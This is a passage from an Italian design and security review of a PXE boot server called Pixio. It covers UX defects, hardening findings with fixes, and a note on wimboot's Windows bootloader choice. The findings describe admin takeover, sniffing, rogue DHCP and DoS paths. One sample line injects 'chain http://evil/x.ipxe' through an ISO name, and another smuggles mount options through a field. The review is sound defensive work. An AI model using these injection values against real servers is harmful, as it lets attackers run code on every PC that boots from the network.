  - *Correzione:* Pulsante 'Verifica' nel pannello ISO e azione bulk 'Verifica tutte le abilitate' (POST /api/catalog/<slug>/verify): per ogni URL della ricetta (dallo stesso preview, righe kernel/initrd) fare HEAD su http://127.0.0.1 con Host=server_ip e riportare stato, dimensione e tempo; per Windows verificare anche la share pxe (smbclient -L). Risultato come pill 'Verificata' (ok, con data) / 'Verifica fallita: sources/boot.wim → 404' (bad) memorizzato nel catalogo (`verify:{at,ok,errors}`) e mostrato nella colonna Stato. Opzionale: 'Test in QEMU' che lancia tests/qemu-screenshot.sh (TCG, 60 s) e mostra lo screenshot nel pannello.
- **[bassa] Soglie di 'disco quasi pieno' incoerenti tra dashboard e backend** — static/app.js renderTiles colora la tile in 'warn' sotto 10 GB liberi; pixio/services/system.py riga 193 emette il warning sotto 2 GB; la copia locale fallisce (catalog.py 469) con 'Spazio su disco insufficiente' senza dire quanto serve. Il tecnico vede la tile gialla ma nessun avviso, o viceversa.
  - *Correzione:* Una sola costante configurabile (settings.disk_warn_gb, default 10) usata da entrambi; il messaggio della copia deve dire 'Servono X GB, liberi Y GB'; prima di avviare la copia la GUI controlla iso.size < disk.free e mostra conferma con i numeri.
- **[bassa] Pagina Log senza filtro per livello né ricerca** — static/logs.js ha solo il select sorgente (all/dnsmasq/nginx/pixio), Pausa e Scarica. In una LAN con 50 PC il log dnsmasq è dominato da righe DHCP di altri host; per cercare un MAC il tecnico deve scaricare il file.
  - *Correzione:* Aggiungere un campo di ricerca client-side (filtra le righe già caricate, evidenzia la corrispondenza), un checkbox 'Solo errori e avvisi' (level warn/error) e nella pagina Client un link 'Vedi log' per MAC che apre #/log?q=<mac>. Mantenere il polling a 2-3 s.
- **[bassa] Il default del menu 'Avvia dal disco locale' con timeout 30 s non è spiegato in Impostazioni** — pixio/config.py: default 'local', timeout 30. Scelta corretta per una PMI (un PC che fa PXE per errore riparte da disco), ma la pagina Menu non spiega la conseguenza opposta: timeout 0 blocca per sempre ogni PC con boot da rete prima del disco, e default = una ISO reinstalla in loop chi ha PXE come primo boot.
  - *Correzione:* Sotto i campi Voce predefinita/Timeout aggiungere un hint dinamico: se default != 'local' → avviso giallo 'I PC con boot da rete come prima opzione avvieranno automaticamente "<nome>" dopo N s'; se timeout = 0 → 'Nessun avvio automatico: i PC resteranno fermi sul menu finché qualcuno non sceglie'.
- **[bassa] Il test 'Verifica connessione' della share restituisce l'output grezzo di smbclient** — sources.test restituisce `output:[str]` da smbclient (helper cmd test-cifs righe 209-210), mostrato tale quale. Righe come 'NT_STATUS_LOGON_FAILURE' o 'protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED' non sono comprensibili al target.
  - *Correzione:* Nel helper, tradurre i codici NT_STATUS più comuni: LOGON_FAILURE → 'Utente o password errati', ACCESS_DENIED → 'Accesso negato alla condivisione', BAD_NETWORK_NAME → 'Condivisione inesistente', CONNECTION_DISCONNECTED/protocol negotiation → 'Versione SMB non compatibile', HOST_UNREACHABLE/IO_TIMEOUT → 'Server non raggiungibile'. Mostrare 'Connessione riuscita: trovate N ISO' contando i *.iso dal listing, con l'output raw sotto <details>.

**Funzioni indispensabili segnalate:**

- Autodiagnosi in un click (Dashboard → 'Esegui controlli'): porte 67/69/80 in ascolto, file TFTP presenti, download TFTP e GET /boot.ipxe reali da localhost, HEAD dei file di ogni ISO abilitata, spazio disco; ogni fallimento con link alla sezione che lo risolve
- Stadio per client PXE (DHCP → TFTP → menu → voce avviata) ricavato dal log dnsmasq, con diagnosi 'Probabile Secure Boot attivo' / 'TFTP bloccato' e ultimo esito per MAC
- Wizard che arriva davvero a 'pronto': passo Scansione con avanzamento e conteggio, passo Abilita con switch per ISO trovata, checklist finale verde/rossa e pulsante finale disabilitato finché non c'è almeno una voce nel menu
- Verifica per ISO abilitata ('Verificata il …' / 'Verifica fallita: file → 404') e azione bulk 'Verifica tutte'
- Avviso persistente se l'IP del server è assegnato via DHCP (con MAC da prenotare) e rilevamento del cambio IP con pulsante 'Aggiorna e rigenera'
- Messaggi di errore CIFS/smbclient tradotti in causa + rimedio (errno 13/112/2/95, NT_STATUS_*), con dettagli tecnici in un expander e toast di errore che non si chiudono da soli
- Card 'Attività in corso' con tutti i job (scansione, copia locale, rilevamento, compilazione iPXE), progresso e Annulla, più cronologia degli ultimi esiti
- Badge piattaforma a tre stati testuali ('BIOS + UEFI', 'Solo BIOS', 'Solo UEFI') con tooltip del motivo, e nella pagina Menu l'elenco delle voci nascoste per la piattaforma selezionata
- Modale al momento dell'abilitazione di una ISO Windows se 'Installazione Windows via rete' è spenta, con 'Attiva e abilita' in un click
- Interruttore tema Automatico/Chiaro/Scuro persistente (il CSS lo supporta già)
- Riordino del menu con pulsanti ▲/▼ e tastiera oltre al drag&drop (tablet/touch)
- Esplora contenuto ISO con click-to-insert per la ricetta personalizzata e 'Prova ricetta' senza salvare
- Card 'Guida rapida per il PC' in Dashboard: tasto di boot per marca, disattivare Secure Boot, abilitare PXE IPv4, cosa aspettarsi a schermo (già scritto in docs/preview.html ma assente dalla SPA)
- Ricerca testuale e filtro 'solo errori' nei Log, con link 'Vedi log' per MAC dalla pagina Client

## Critica: Sicurezza (GUI in LAN, credenziali su disco, helper sudo, injection nel menu iPXE, share Samba, TFTP/PXE non autenticato, CSRF/sessioni/secret/default password)

Il design è sopra la media per una PMI: helper root a comandi chiusi (argparse+regex+realpath, nessuna shell), password hashate (werkzeug/scrypt), CSRF via header, credenziali CIFS in file root 0600 come da man mount.cifs, slug/UNC/IP validati sia nell'app sia nell'helper. Ma la spec ignora tre confini di fiducia reali: (1) tutto viaggia in HTTP in chiaro e la prima password admin la fissa "chi arriva prima" in LAN; (2) la share Samba scrivibile `iso`/`drivers` (password min 4 caratteri) equivale al controllo di ciò che ogni PC avvia via PXE e dei driver caricati con drvload in WinPE; (3) l'utente `pixio` possiede /etc/pixio e può quindi sostituire la cartella `sources/` da cui root monta share CIFS senza rivalidare. Correggendo questi punti, più il leak pubblico di /boot/inject/<slug>/install.cmd e il rischio DHCP "full" su una LAN con DHCP esistente, il progetto è adeguato all'uso previsto.

- **[alta] Bootstrap della password admin: "chi arriva prima" in LAN diventa amministratore** — docs/API.md e pixio/auth.py (login): «Se password_set è false, la prima password inviata diventa quella dell'amministratore». Dopo install.sh il servizio è già in ascolto su :80 su tutte le interfacce; tra l'installazione e il primo accesso del tecnico (o dopo un reset della config) qualunque host della LAN può fare POST /api/auth/login e diventare admin, quindi montare share, cambiare DHCP in modalità full (MITM di rete), avviare ISO arbitrarie sui client. Il rate limit non aiuta (non c'è nulla da indovinare).
  - *Correzione:* install.sh genera un token monouso (secrets.token_urlsafe(24)) in /etc/pixio/setup-token (root:pixio 0640) e lo stampa a console a fine installazione; /api/auth/login con password_set=false richiede anche {"setup_token": ...} e cancella il file dopo l'uso. In alternativa (più semplice): install.sh chiede la password interattivamente (o la legge da PIXIO_ADMIN_PASSWORD) e chiama pixio-admin set-password prima di systemctl start pixio; il login senza password impostata deve rispondere 403 con messaggio «eseguire pixio-admin set-password».
- **[alta] GUI e API solo in HTTP: password admin e cookie di sessione in chiaro sulla LAN** — ARCHITECTURE.md: «nginx su :80 ... reverse proxy della GUI»; pixio/__init__.py non imposta SESSION_COOKIE_SECURE (default False, doc Flask config). Chiunque sniffi/ARP-spoofi la LAN (o un AP Wi-Fi ospiti sullo stesso segmento) legge la password al login e il cookie pixio_session (valido 12 h, PERMANENT_SESSION_LIFETIME) e prende il controllo del server PXE. La lens dice esplicitamente «GUI amministrativa esposta in LAN».
  - *Correzione:* In install.sh generare un certificato self-signed (openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -days 3650 -nodes -subj "/CN=pixio" -addext "subjectAltName=IP:<server_ip>") in /etc/pixio/tls/. Nel template nginx: `server { listen 443 ssl; ssl_certificate ...; location / { proxy_pass 127.0.0.1:8080 } }` e nel server :80 tenere SOLO `location /pxe/`, `location = /boot.ipxe`, `location /boot/` (proxy) e `location / { return 301 https://$host$request_uri; }`. In Flask: SESSION_COOKIE_SECURE=True, e nel before_request rifiutare le route /api/* se request.scheme != 'https' (ProxyFix già legge X-Forwarded-Proto). Nella GUI mostrare l'impronta del certificato in Impostazioni per il TOFU del tecnico. I client iPXE restano in HTTP (nessuna modifica alle ricette).
- **[alta] La password della share Samba scrivibile (min 4 caratteri) equivale a controllare cosa avviano tutti i PC e quali driver kernel carica WinPE** — helper cmd_samba_password: `if not pw or len(pw) < 4` ; api_settings.samba_password: `len(pw) < 4`. Le share `iso` e `drivers` sono `read only = no` con `valid users = pixio` (render_smb) e abilitate di default (samba_share_enabled: True). Chi conosce quella password può: sostituire una ISO già abilitata (stesso nome/dimensione -> il catalogo la considera la stessa voce), oppure mettere .inf/.sys in una cartella con flag winpe_inject: drivers.winpe_inject_files li inietta via wimboot e install.cmd fa `drvload` (codice in kernel mode su ogni client Windows). Nessun lockout Samba, SMB2 senza `smb encrypt`. La spec la descrive come comodità, non come credenziale amministrativa.
  - *Correzione:* (1) Lunghezza minima 12 caratteri in helper e API, con generatore nella GUI (secrets.token_urlsafe(12)) e testo «questa password permette di modificare le immagini avviate da tutti i PC». (2) `samba_share_enabled` default False finché non è impostata una password (oggi la GUI mostra solo un warning). (3) In render_smb aggiungere `smb encrypt = desired` e `server signing = mandatory` (smb.conf(5)); valutare `hosts allow = <subnet LAN>`. (4) Nel catalogo: quando size/mtime di una ISO già `enabled` cambiano (catalog.scan -> `changed`), disabilitarla automaticamente e mostrare avviso «immagine modificata: riabilitare» (protezione da sostituzione silenziosa). (5) Per winpe_inject/setup_load: salvare uno sha256 dei file al momento in cui l'admin attiva il flag e rifiutare l'iniezione se cambiano (drivers.winpe_inject_files).
- **[media] L'utente pixio possiede /etc/pixio: può sostituire la cartella sources/ e far montare a root share CIFS con opzioni arbitrarie** — install.sh: `chown pixio:pixio /etc/pixio; chmod 750 /etc/pixio` mentre `sources/` è root 0700. Il proprietario della directory padre può fare `mv /etc/pixio/sources /etc/pixio/sources.old && mkdir sources` (rename nello stesso padre non richiede permessi sulla dir figlia) e scrivere <sid>.json/.cred propri. L'helper `cmd_mount_cifs` legge `d["unc"]` e `d["vers"]` dal JSON SENZA rivalidarli (UNC_RE/VERS_RE sono applicate solo in write-source) e li passa a `mount -t cifs ... -o ...,vers=<x>`: una `vers` con virgole inietta opzioni di mount arbitrarie. Non è root diretto, ma vanifica lo scopo dichiarato dell'helper («ogni argomento validato»): un RCE nell'app Flask ottiene mount CIFS controllati da root. Confidenza: alta sulla rinominabilità, media sull'impatto pratico.
  - *Correzione:* install.sh: `/etc/pixio` root:root 0755; `config.json` pixio:pixio 0640; `secret` pixio 0600; `sources/` root 0700 (invariato). Nell'helper, `source_def()` deve rivalidare: `if not UNC_RE.match(d.get('unc','')) or (d.get('vers') and not re.match(VERS_RE, d['vers'])): raise HelperError(...)`, e `guest`, `domain`, `username` solo tipi/char-set attesi. Aggiungere `check_source_id` anche sui nomi file letti in cmd_mount_all.
- **[media] Modalità DHCP "full" con dhcp-authoritative attivabile dalla GUI su una LAN che ha già un DHCP** — render_dnsmasq (mode full): `dhcp-range=...`, `dhcp-authoritative`, `dhcp-option=option:router,...`. La spec stessa dice «ESISTE GIA' UN DHCP SERVER in LAN (10.10.0.1)». Un click in Impostazioni (o un admin compromesso) crea un DHCP concorrente autoritativo che riassegna gateway/DNS a tutta la LAN: outage o MITM. Nessun controllo o conferma previsti dalla spec.
  - *Correzione:* Prima di salvare dhcp_mode=full: l'app verifica se esiste un altro DHCP sull'interfaccia (es. `nmap --script broadcast-dhcp-discover` non è installato: usare un DHCPDISCOVER raw con python socket/scapy-less, oppure controllare che l'IP dell'interfaccia sia statico e non da dhcpcd: `/run/dhcpcd/` o `ip -j addr` -> 'dynamic'). Se rilevato un DHCP esterno, rifiutare con 409 salvo flag esplicito `force:true` + conferma UI con testo della subnet. Non emettere `dhcp-authoritative` per default (dnsmasq(8): senza authoritative dnsmasq non NAK i lease altrui). Loggare l'evento in un audit log.
- **[media] Password della share Windows [pxe] servita senza autenticazione a chiunque in LAN** — boot.py `/boot/inject/<slug>/install.cmd` è in PUBLIC_PREFIXES ("/boot/") e winpe.install_cmd inserisce `net use S: \\<ip>\pxe {wpass} /user:{wuser}` con la password in chiaro presa da config.json (`windows.smb_password`, salvata in chiaro e restituita anche da GET /api/settings perché public_config include la sezione `windows`). Gli slug sono enumerabili da GET /boot.ipxe?platform=efi (pubblico). L'impatto diretto è basso (share ro su /srv/pixio/http, già pubblica via /pxe/), ma è una credenziale reale di un utente Unix di sistema (`useradd --system`) e viene «pubblicata» per design. Inoltre `smb_user` viene passato a `useradd`/`smbpasswd`: se in config.json valesse `pixio` (non impostabile da API ma sì da file), la password pubblica aprirebbe le share scrivibili.
  - *Correzione:* Accettare che la credenziale sia pubblica e trattarla come tale: (a) nell'helper `cmd_windows_share_password` forzare il nome utente a una costante (es. `pixio-pxe`) e rifiutare se `pwd.getpwnam(wuser)` esiste già e non è stato creato da Pixio (uid non di sistema o uguale a SERVICE_USER); (b) in render_smb aggiungere alla share [pxe] `hosts allow = <subnet interfaccia>`; (c) togliere `smb_password` da public_config (mostrare solo `smb_password_set`); (d) nella GUI, testo: «la password di questa share è visibile a tutti i PC della LAN: la share è in sola lettura». Alternativa: servire install.cmd solo a chi ha scaricato boot.wim (impraticabile); non vale la pena.
- **[media] Nessun limite di dimensione del body sulle route pubbliche: memory DoS non autenticato** — nginx: `client_max_body_size 0` e `proxy_request_buffering off`; Flask: `MAX_CONTENT_LENGTH=None`; gunicorn 1 worker/8 thread. `POST /api/auth/login` (pubblico) fa `request.get_json()` che carica tutto il body in RAM: pochi POST da alcuni GB (3.8 GiB RAM sulla macchina) uccidono gunicorn (Restart=always ma con loop). Lo stesso vale per qualunque POST autenticato non-upload.
  - *Correzione:* Nel before_request: `request.max_content_length = 64 * 1024` per tutte le route, tranne `PUT /api/upload/<id>/chunk/<n>` dove impostare `chunk_size + 1024` (8 MiB). In nginx: `client_max_body_size 64k` di default e `location ~ ^/api/upload/[0-9a-f]{16}/chunk/ { client_max_body_size 16m; proxy_pass ... }`. Aggiungere `limit_req_zone $binary_remote_addr zone=login:1m rate=5r/m;` su `location = /api/auth/login`.
- **[media] nginx e Samba in ascolto su tutte le interfacce: contenuti PXE e API raggiungibili da altre VLAN/WAN** — nginx-pixio.conf.tpl: `listen 80 default_server` (tutte le interfacce, anche una seconda NIC/VPN), `autoindex on` su /pxe/ che elenca tutte le ISO montate, i driver e /pxe/tftp/. dnsmasq è invece legato a `interface=<iface>`. Se il server ha più interfacce o è raggiungibile via routing, l'intero catalogo (e la GUI di login) è esposto oltre il segmento dove serve PXE.
  - *Correzione:* render_nginx deve renderizzare (oggi restituisce il template statico): `listen <server_ip>:80;` (+ `:443 ssl`) e, per /pxe/, /boot.ipxe e /boot/: `allow <subnet della interfaccia>; allow 127.0.0.1; deny all;` con la subnet calcolata da `ip -j addr show <iface>` (prefixlen). Tenere `autoindex on` (comodo per debug) ma solo dentro l'allow. In smb.conf già c'è `bind interfaces only`; aggiungere `hosts allow`.
- **[media] Sessione Flask stateless: il cambio password non invalida cookie rubati; nessun audit delle azioni admin** — auth.change_password aggiorna solo l'hash; `logged_in()` controlla solo `session['user']`. Un cookie sottratto (HTTP in chiaro, vedi sopra) resta valido fino a 12 h anche dopo il cambio password. La spec non prevede alcun log delle azioni amministrative (chi ha abilitato una ISO, cambiato DHCP, spento il server), utile in una PMI per capire «chi ha fatto cosa».
  - *Correzione:* Salvare in session anche `session['pw'] = hash[-16:]` (frammento dell'hash) e in `logged_in()` verificare `hmac.compare_digest(session.get('pw',''), current_hash[-16:])`; cambio password => tutte le sessioni decadono. Aggiungere un audit log append-only `/var/log/pixio/audit.log` (ts, ip, metodo, path, esito) scritto da un after_request per i metodi POST/PUT/PATCH/DELETE, mostrato nella pagina Log.
- **[media] Binari e sorgenti scaricati senza verifica di integrità e compilati/eseguiti come root** — install.sh: `curl -fsSL -o wimboot https://github.com/ipxe/wimboot/releases/latest/download/wimboot` (nessun checksum: la release page v2.9.0 non pubblica .sha256/.sig); ipxe/build.sh: `git clone --depth 1 https://github.com/ipxe/ipxe.git` (branch master non fissato) e `make` eseguito come root via systemd-run (cmd_rebuild_ipxe). Un MITM/compromissione upstream produce un iPXE/wimboot malevolo avviato da tutti i PC della LAN e codice eseguito come root sul server.
  - *Correzione:* Fissare le versioni: `WIMBOOT_VER=v2.9.0` + `WIMBOOT_SHA256=<hash noto>` verificato con `sha256sum -c`; per iPXE `git clone` + `git checkout <commit/tag fissato>` (es. tag `v1.21.1`) con verifica `git rev-parse HEAD`. Eseguire la build come utente non privilegiato: `systemd-run --uid=pixio ... build.sh` con output in una dir temporanea e copia finale in /srv/pixio/tftp fatta dall'helper. Rendere `ipxe/src` di proprietà di pixio (o usare /var/lib/pixio/ipxe-src).
- **[bassa] Injection nel commento dello script iPXE tramite nome ISO con a capo** — ipxe_menu.entry_script: `head = ["#!ipxe", f"# Pixio - {e['name']} ({e.get('type_name')}) - {platform}", ...]` non passa da `_safe` (usato invece per le voci del menu). `catalog.update` fa solo `.strip()[:120]` sul nome; detect.iso_label decodifica 32 byte del PVD con `errors='ignore'` senza rimuovere \n. Un nome contenente `\nchain http://evil/x.ipxe` diventa un comando iPXE eseguito sui client. Attaccante: admin (già fidato) o chi può scrivere ISO nella share (che comunque controlla già il contenuto avviato): guadagno reale piccolo, ma è una injection vera e la correzione costa una riga.
  - *Correzione:* In entry_script usare `_safe(e['name'])` anche nel commento; in catalog.update rifiutare/normalizzare `\r\n` nel nome (`re.sub(r'[\r\n\t]', ' ', ...)`); in detect.iso_label filtrare a caratteri stampabili (`''.join(c for c in s if 32 <= ord(c) < 127)`). Aggiungere test in tests/test_plumbing.py con un nome contenente newline.
- **[bassa] Utente di servizio pixio nei gruppi adm e systemd-journal: legge tutti i log di sistema** — install.sh: `useradd ... -G systemd-journal,adm`. Serve solo a leggere /var/log/nginx/pixio-access.log e `journalctl -u pixio`. Con `adm` l'app (e chi la compromette) legge auth.log, log Samba (con IP/utenti), tutto il journal di sistema.
  - *Correzione:* Rimuovere `adm`; nel template nginx usare `access_log /var/log/pixio/nginx-access.log pixio;` con /var/log/pixio pixio:pixio (nginx scrive come root, file 0640 root:pixio via logrotate `create 0640 root pixio`). Per il journal, al posto di systemd-journal usare `StandardOutput=append:/var/log/pixio/app.log` nella unit, oppure mantenere solo systemd-journal (meno sensibile di adm).
- **[bassa] Endpoint pubblico /boot.ipxe scrive su disco per ogni richiesta (record_seen) e accetta parametri spoofabili** — boot.boot_menu: ogni GET con `?mac=` fa `update_json(CLIENTS_FILE)` (tmp+fsync+rename). Un host LAN può inviare migliaia di richieste con MAC casuali: I/O continuo e churn della tabella client (il cap a 500 elimina i client legittimi senza nome). `auto_boot` viene scelto in base al MAC dichiarato dal client (spoofabile), ma l'impatto è solo sulla propria macchina.
  - *Correzione:* In record_seen ignorare aggiornamenti se `last_seen` < 10 s fa per lo stesso MAC (nessuna scrittura); nginx `limit_req_zone ... zone=boot:1m rate=30r/m` su `/boot.ipxe` e `/boot/`. Documentare che auto_boot è una comodità, non un controllo di accesso.
- **[bassa] Mount in loop (iso9660/udf) di ISO caricate da utenti della share: superficie kernel esposta a root** — helper mount_iso_ro/cmd_mount_detect: `mount -t udf` / `mount -o loop,ro` di file provenienti dalla libreria scrivibile via Samba/upload. Il parsing di filesystem non fidati avviene nel kernel: storicamente iso9660/udf hanno avuto bug. Rischio reale contenuto in una PMI, ma il rilevamento (`mount-detect`) avviene automaticamente per ogni nuova ISO trovata, senza intervento dell'admin.
  - *Correzione:* Praticabile: eseguire il rilevamento senza mount, leggendo l'indice con `isoinfo -f -i <file>` / `bsdtar -tf` (pacchetti genisoimage/libarchive-tools) e montare in loop solo quando l'admin abilita la voce. In alternativa mantenere il mount ma solo su ISO abilitate esplicitamente. Documentare nella GUI che le ISO caricate sono fidate.
- **[bassa] pixio-admin set-password passa la password come argomento (visibile in ps/journal)** — bin/pixio-admin: `sudo -u pixio python3 -c "..." "$PW"` -> la password compare in argv del processo per la durata dell'esecuzione (leggibile da ogni utente locale via /proc/*/cmdline) e potenzialmente nel log di sudo.
  - *Correzione:* Passare la password via stdin: `printf '%s\n' "$PW" | sudo -u pixio python3 -c 'import sys; ...; auth.set_password(sys.stdin.readline().rstrip("\n"))'`.

**Funzioni indispensabili segnalate:**

- HTTPS con certificato self-signed generato da install.sh per GUI/API (porta 443), :80 riservato ai client PXE (/pxe/, /boot.ipxe, /boot/); cookie Secure; impronta del certificato mostrata in Impostazioni
- Bootstrap sicuro della password amministratore (token monouso stampato a console o password chiesta da install.sh) invece di "prima password inviata = admin"
- Restrizione per subnet/interfaccia di nginx e Samba (listen <server_ip>, allow/deny sulla subnet dell'interfaccia PXE, hosts allow in smb.conf)
- Politica password per la share Samba scrivibile (min 12 caratteri, generatore nella GUI, share disabilitata finché non impostata) e avviso esplicito che equivale a controllare le immagini avviate in LAN
- Rilevamento della modifica di ISO/driver abilitati (size/mtime o sha256) con disabilitazione automatica e avviso; hash dei driver iniettati in WinPE fissato al momento dell'attivazione del flag
- Audit log append-only delle azioni amministrative (ts, IP, azione, esito) visibile nella pagina Log; invalidazione delle sessioni al cambio password
- Modalità "solo client conosciuti" opzionale in dnsmasq: `dhcp-host=<mac>,set:known` per i client con nome + `dhcp-ignore=tag:!known` (dnsmasq(8)); e un pulsante "Pausa PXE" (stop dnsmasq) per evitare avvii accidentali in produzione. Confidenza media sull'efficacia di dhcp-ignore in proxyDHCP: da testare con QEMU
- Protezione opzionale per voce di menu con PIN (iPXE `login` -> `${password}` inviata come parametro a /boot/<slug>.ipxe e verificata dal server, cfr. https://ipxe.org/cmd/login) per voci distruttive (Clonezilla restore, installazioni unattended)
- Guardia contro DHCP concorrente: rifiuto/conferma esplicita della modalità full se esiste già un DHCP sulla LAN, niente dhcp-authoritative per default
- Limiti di dimensione del body per route (64 KiB salvo i chunk di upload) e rate limit nginx su /api/auth/login e /boot*
- Versioni fissate e checksum verificati per wimboot e iPXE (tag/commit + sha256); build iPXE come utente non privilegiato; aggiornamenti di Pixio da tag firmati e non da `git pull` di main
- Hardening della unit pixio.service (ProtectSystem=strict, ReadWritePaths=/var/lib/pixio /var/log/pixio /srv/pixio/library /srv/pixio/cache /srv/pixio/http/drivers /srv/pixio/http/inject /etc/pixio, PrivateTmp, ProtectHome; NoNewPrivileges NON attivabile per via di sudo) e sudoers con `Defaults:pixio use_pty, env_reset`
- Backup/esportazione della configurazione dalla GUI che escluda esplicitamente /etc/pixio/secret e /etc/pixio/sources/*.cred, con avviso che le credenziali CIFS vanno reinserite al ripristino
- Documentazione nella GUI del modello di fiducia: PXE non è autenticato, chiunque nel segmento vede il catalogo e può avviare qualsiasi voce; consigliare VLAN dedicata o la modalità "solo client conosciuti" e account AD di sola lettura dedicato per le share remote


## Avvio di Windows con wimboot: il bootloader "_EX" (9 set 2026)

Le immagini di Windows dalla 24H2 in avanti contengono **due** bootloader UEFI dentro `boot.wim`:
`\Windows\Boot\EFI\bootmgfw.efi`, firmato *Microsoft Windows Production PCA 2011*, e
`\Windows\Boot\EFI_EX\bootmgfw_EX.efi`, firmato *Windows UEFI CA 2023*. wimboot 2.9.0
(`src/efiboot.c`) prova **sempre per primo** quello `_EX` e ripiega sull'altro solo se `LoadImage()`
fallisce: con Secure Boot disattivato `LoadImage()` riesce sempre, quindi viene scelto sempre `_EX`.

Sulle immagini montate qui: hanno `_EX` la LTSC 2024, la 24H2, la 25H2 e Server 2025; non ce l'hanno
la LTSC 2021, la LTSC IT pre e Server 2022.

Perche' annotarlo: in una riproduzione in QEMU le tre immagini che l'utente aveva visto riavviarsi
sono esattamente e solo quelle con `_EX`. La corrispondenza non e' una prova (il riavvio in QEMU si
e' poi rivelato un artefatto della CPU emulata `qemu64`, che non ha SSE4.2 ne' POPCNT richiesti da
Windows 11 24H2; con `-cpu max` tutte le prove arrivano a WinPE) e sul campo il WinPE della LTSC 2024
poi e' partito. Resta pero' la strada da provare per prima se un firmware reale rifiuta di avviare
il bootloader nuovo: si forza quello classico aggiungendo alla ricetta il file della ISO

    initrd {http_iso}/efi/boot/bootx64.efi bootx64.efi

verificato funzionante in laboratorio (wimboot scrive `found bootloader file bootx64.efi`).
